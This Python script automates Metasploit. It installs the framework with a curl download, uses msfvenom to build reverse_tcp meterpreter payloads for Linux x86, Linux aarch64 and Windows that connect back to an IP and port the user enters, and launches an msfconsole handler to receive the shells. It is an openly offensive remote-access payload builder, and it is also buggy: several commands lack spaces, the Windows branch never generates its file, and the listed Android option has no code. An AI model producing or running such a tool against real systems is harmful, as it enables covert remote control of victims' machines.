import os

sg=input("You want to install the tool: Metasploit [y,n]: ")
if sg=="y":
    print(os.system("""sudo apt install curl
  curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall && \
  rm msfinstall"""))
print("---------------Base Info---------------")
IPserver=input("IP-s: ")
Porttunnel=input("Port-s: ")
output=input("name-file: ")
print("linux, windows, android")
platform=input("platform: ")

if platform=='linux':
  print('aarch64 or x86')
  arch=input('Select arch: ')
  if arch=='x86':
    print("---------------Payload Creation---------------")
    payload='msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST='+IPserver+'LPORT='+Porttunnel+' --platform linux -a x86 -f elf -o '+output 
    print('---------------Starting---------------')
    os.system('sudo'+payload)
    print('you want to wait for a connection from the file?')
    listing=input('y/n: ')
    if listing=='y':
      os.system('sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST'+IPserver+';set LPORT '+Porttunnel+'; run"')
    #aarch64
  elif arch=='aarch64':
    payload='msfvenom -p linux/aarch64/meterpreter/reverse_tcp LHOST='+IPserver+' LPORT='+Porttunnel+' -f elf -o '+output
    print('---------------Starting---------------')
    os.system('sudo '+payload)
    print('you want to wait for a connection from the file?')
    listing=input('y/n: ')
    if listing=='y':
      os.system('sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/aarch64/meterpreter/reverse_tcp; set LHOST '+IPserver+'; set LPORT '+Porttunnel+'; run"')
if platform=='windows':
  print("---------------Payload Creation---------------")
  payload='msfvenom -p windows/meterpreter/reverse_tcp LHOST='+IPserver+' LPORT='+Porttunnel+' -f exe -o '+output
  print('---------------Starting---------------')
  payload='sudo '+payload
  listing=input('y/n: ')
  if listing=='y':
    os.system('sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST '+IPserver+'; set LPORT '+Porttunnel+'; run"')


  